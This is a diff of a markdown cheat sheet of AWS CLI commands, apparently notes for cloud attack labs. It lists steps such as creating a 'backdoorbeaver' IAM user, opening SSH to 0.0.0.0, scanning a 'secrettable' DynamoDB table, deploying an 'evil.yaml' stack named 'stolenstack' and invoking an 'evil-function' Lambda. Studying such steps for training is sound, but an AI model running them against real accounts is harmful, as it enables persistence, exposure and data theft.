@@ -68,7 +68,7 @@ aws iam create-user --user-name backdoorbeaver
 aws iam create-access-key --user-name Bob
 ```
 
-## EC2, list, deploy
+## EC2, list, deploy, secu group
 ```
 aws ec2 describe-subnets
 aws ec2 describe-security-groups
@@ -77,6 +77,7 @@ aws iam list-instance-profiles
 aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'
 
 aws ec2 run-instances --subnet-id subnet-.... --image-id ami-... --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-..."
+aws ec2 authorize-security-group-ingress --group-id ... --protocol tcp --port 22 --cidr 0.0.0.0
 ```
 
 
@@ -88,7 +89,9 @@ chmod 400 mighty.pem
 
 ## dynamodb
 ```
+aws dynamodb list-tables | jq -r .TableNames[]
 aws dynamodb scan --table-name secrettable-233223 --region us-east-1
+
 ```
 
 ## secret
@@ -133,8 +136,16 @@ aws lambda invoke --function-name evil-function output.txt
 aws cloudformation list-stack-resources --stack-name weatherman
 aws cloudformation describe-stack-events --stack-name intensification90
 aws cloudformation get-template --stack-name stackmanfred
+aws cloudformation validate-template --template-body file://evil.yaml
 aws cloudformation create-stack --template-body file://evil.yaml --stack-name stolenstack --parameters ParameterKey=uri,ParameterValue=$uri --output text
 aws cloudformation describe-stacks --stack-name stolenstack  --query Stacks[*].Outputs --output text
 aws cloudformation delete-stack --stack-name stolenstack --output text
+```
+
+## Wiuuu wiuuu cloudwatch, snes
+```
+aws lambda get-function --function-name DynamoFunction  
+aws lambda list-functions
+aws lambda invoke --function-name evil-function output.txt
 ```
 
